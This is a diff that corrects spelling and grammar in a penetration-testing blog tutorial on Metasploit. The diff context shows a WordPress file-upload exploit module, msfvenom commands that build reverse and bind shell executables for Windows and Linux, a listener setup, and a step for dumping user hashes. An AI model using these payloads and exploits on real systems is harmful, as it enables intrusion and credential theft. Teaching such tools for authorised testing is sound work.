@@ -13,12 +13,12 @@ comments: true
 
 ## Introduction 
 
-_**In this blog post we will discuss and use some modules to learn metasploit-framework usage.**_ 
+_**In this blog post we will discuss and use some modules to learn Metasploit-framework usage.**_ 
 
 
 **Metasploit Commands and Interaction**
 
-Lauch msfconsole and follow bellow commands
+Launch msfconsole and follow bellow commands
 
 ```
 # msfconsole
@@ -31,7 +31,7 @@ To know all commands about metasploit-framework simple execute 'help' in msfcons
 msf5 > help
 
 ```
-And the result will be awesome, I suggest you to read everything from their because we will use them ahead.
+And the result will be awesome, I suggest you read everything from there because we will use them ahead.
 
 
 **Mentioning some important commands:**
@@ -201,7 +201,7 @@ Target a block from a resolved domain name:
 **Scanning using metasploit**
 
 
-Lets scan ports using metasploit
+Let's scan ports using metasploit
 
 ```
 # msfconsole
@@ -225,7 +225,7 @@ Matching Modules
    7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
 ```
 
-**Lets use port TCP ACK Firewall Scanner to scan target network**
+**let's use port TCP ACK Firewall Scanner to scan target network**
 
 ```
 msf > use auxiliary/scanner/portscan/ack
@@ -278,9 +278,9 @@ Run 'msfconsole'
 msf5 > show exploits
 ```
 
-**This will list all the exploits in database, choose any to see the usage.**
+**This will list all the exploits in the database, choose any to see the usage.**
 
-For example, i found a wordpress vulnerabilty in a unix server, called latform Theme File Upload Vulnerability.
+For example, I found a WordPress vulnerability in a Unix server, called latform Theme File Upload Vulnerability.
 
 ```
 msf5 > use exploit/unix/webapp/wp_platform_exec
@@ -325,22 +325,22 @@ msf5 exploit(unix/webapp/wp_platform_exec) > run
 [*] Uploading payload
 ```
 
-And this will exploit the vulnerabilty on the target and you will get meterpreter shell on your metasploit-framework.
+And this will exploit the vulnerability on the target and you will get meterpreter shell on your metasploit-framework.
 
 
 **Msfvenom**
 
-Its my personal favourite, i will explain to use it in my way.
+It's my personal favorite, I will explain it to use it in my way.
 
 ```
 msfvenom -l
 ```
 
 
-Lets create a windows reverse TCP shell
+Let's create windows reverse TCP shell
 
 
-Launch your terminal and execute command below
+Launch your terminal and execute the command below
 
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > hackershell.exe
@@ -357,13 +357,13 @@ msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> 
 ```
 
 
-To create linux Meterpreter Reverse Shell
+To create Linux Meterpreter Reverse Shell
 
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > hacker.elf
 ```
 
-To create linux Bind Meterpreter Shell
+To create Linux Bind Meterpreter Shell
 
 ```
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > hacker.elf
@@ -420,13 +420,13 @@ msf5 exploit(multi/handler) > Run
   
 Boom you will get meterpreter shell easily
 
-After getting meterpreter shell run 'help' command it will show what you can do in target system
+After getting meterpreter shell run 'help' command it will show what you can do in the target system
 
 ```
 meterpreter > help
 ```
 
-To list all run commands in target system execute 'run tab+tab' and enter it will show all run commands.
+To list all run commands in the target system execute 'run tab+tab' and enter it will show all run commands.
 
 To dump all target system user hashes use
 
@@ -455,4 +455,4 @@ meterpreter >
 
 ## Conclusion
 
-_**I have explained basic use cases of metasploit-framework, because its a all in one platform to perform penetration test look also in offsec free [metasploit unleashed training](https://www.offensive-security.com/metasploit-unleashed/).
+_**I have explained basic use cases of Metasploit-framework because its an all in one platform to perform penetration test look also in offsec free [metasploit unleashed training](https://www.offensive-security.com/metasploit-unleashed/).
